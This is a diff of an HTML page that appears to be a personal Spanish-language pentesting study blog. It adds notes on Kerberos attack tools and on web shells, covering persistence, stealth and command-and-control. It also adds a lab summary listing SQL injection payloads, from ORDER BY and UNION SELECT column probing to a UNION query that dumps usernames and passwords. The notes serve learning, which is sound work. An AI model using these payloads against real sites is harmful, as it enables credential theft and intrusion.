@@ -26,13 +26,17 @@
           <li><a class="nav-link" href="#SP">Politicas de Seguridad</a></li>
           <li><a class="nav-link" href="#BCP">Basicos Conceptos de Pentesting</a></li>
           <li><a class="nav-link" href="#RF">Reconocimiento o Footprinting</a></li>
-          <li><a class="nav-link" href="#RF">Investigando mas de Regex</a></li>
+          <li><a class="nav-link" href="#IR">Investigando mas de Regex</a></li>
+          <li><a class="nav-link" href="#WS">Web Shells</a></li>
+          <li><a class="nav-link" href="#RL">Resume Labs</a></li>
         </ul>
       </nav>
       
       <main id="main-doc">
         
         <img class="banner" src="baneer.jpg" alt="">
+        <h3 style="font-family: OCR A Std, monospace;">Estevez Camata Melany</h3>
+        <h2>"Pour critiquer les gens il faut les connaître, et pour les connaître, il faut les aimer".</h2>
     <!-- post1 -->
     <section class="main-section" id="Redes_Inalambricas">
       <header>Redes Inalambricas</header>
@@ -387,7 +391,7 @@ hola paris
 <p>1.Al KDC se solicita un Ticket de TGT.</p>
 <p>2.KDC Verificay devuelve un Ticket TGT y la clave de Sesion.</p>
 <p>3.TGT se cifra mediante TGS</p>
-<p>4.El cliente alamcena el TGT  con un Periodo de expiracion.</p>
+<p>4.El cliente alamAcena el TGT  con un Periodo de expiracion.</p>
 Client
 <p>5.Si se si acceder a un Recurso SPN se envia el TGT a un TGS.</p>
 <p>6.KDC verifica el TGT para dar acceso.</p>
@@ -396,6 +400,8 @@ Client
 <h4>¿Es vunerable Kerberos?</h4>
 <p>-Malware</p>
 <p>-Contraseñas debiles.</p>
+<h4>Tools para Ataque a Kerberos</h4>
+<p>Rubeus,Kerbrute.</p>
 <img src="./kerberos/kerberos.jpg" alt="Kerberos">
       </article>
     </section>
@@ -489,7 +495,7 @@ Client
       <article>
         <p>Es importante para parsear las salidas ,que usamos grep debemos usar el flag -E para usar especiales caracteres usamos un backslash '\'</p>
         uno de los usos para conseguir una ip.
-como por ejemplo para busca una Ip:
+        como por ejemplo para busca una Ip:
 <img src="./RegexFolder/ip.PNG" alt="">ahora si nosotros remplazamos la expresion en bash  usando grep -e esto deberiar validar las ip .
 grep -o -e ..:
 <h3>Mirar adentro</h3>
@@ -504,6 +510,55 @@ grep -o -e ..:
 
 
     </section>
+    <!-- post14 -->
+    <section class="main-section"  id="WS">
+    <header>WebShells</header>
+    <p style="font-family: 'Bitter', serif;">4/08/21</p>
+    <article>
+      <p>Los webshells son scripts que tienen el objetivo de ganar acceso y persistencia en una web comprometida.Esto se puede obtener de diferentes formas tambien las web se pueden encontrar en diferentes lenguajes y no son prohibidos por eso exiten muchos projectos en github.</p>
+      <h4>Persistencia en los Accesos Remotos </h4>
+      <p>Scripts usualmente continen backdoors,para que no sea tan visible,la interaccion no debe ser tan notable,se pueden usar passwords  como autenticadores,cookies ,especificas IP address,la ofuscación y el sigilo son la clave. </p>
+      <h4>Escalacion de Privilegios</h4>
+      <p>Es importante encontrar vunerabilidades locales para ser ROOT.</p>
+      <h4>Pivoting</h4>
+      <p>Se tiene el objetivo de conocer todo sobre el server y su red, teniendo in oculto acceso(persistente acceso) debemos realizar estudios</p>
+      <h4>Zombie</h4>
+      <p>Comand and Conttrol (C&C) server nos da el poder .</p>
+    </article>
+    </section>
+    <!-- post15 -->
+    <section class="main-section"  id="RL">
+      <header>Resume Labs</header>
+      <p style="font-family: 'Bitter', serif;">6/08/21</p>
+      <article>
+        <h4>SQL Injection</h4>
+        <p>Union Keyword usada para ataques,agrupando SELEECT queries.</p>
+        <img src="./labs/union.png" alt="">
+        <p>¿Cuantas columnas son requeridas en una SQL Injeccion?</p>
+        <h4><strong>ORDER BY</strong></h4>
+        <p>Por ejemplo, suponiendo que el punto de inyección es una cadena entre comillas dentro de la cláusula WHERE de la consulta original,podriamos  enviar:</p>
+        <code>' ORDER BY 1--</code>
+        <code>' ORDER BY 2--</code>
+        <h4><strong>UNION</strong></h4>
+        <p>El nro de nulls es el nro de columnas que intentamos adivinar.</p>
+        <code>' UNION SELECT NULL-- </code>
+        <code>' UNION SELECT NULL,NULL-- </code>
+        <code>' UNION SELECT NULL,NULL,NULL-- </code>
+        <p>El valor NULL es compatible con todos los valores.</p>
+        <h3>Obtener columnas</h3>
+        <p>Es importante determinar el tipo de data que se obtiene como ser string.</p>
+        <code>' UNION SELECT 'a',NULL--</code>
+        <code>' UNION SELECT NULL,'b'--</code>
+        <strong>tambien podemos determinar esto de algun otra tabla pero si conocemos el Nombre.</strong>
+        <code>' UNION SELECT username, password FROM users--</code>
+        <h3>Concatenacion</h3>
+        <p>Podemos recuperar varias columnas concatenando incluso adicionando simbolos para su comprension.</p>
+        <code>' UNION SELECT username || '-' || password FROM users--</code>
+        <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet"></a>
+      </article>
+      </section>
+      
+
   </main>
 </body>
 
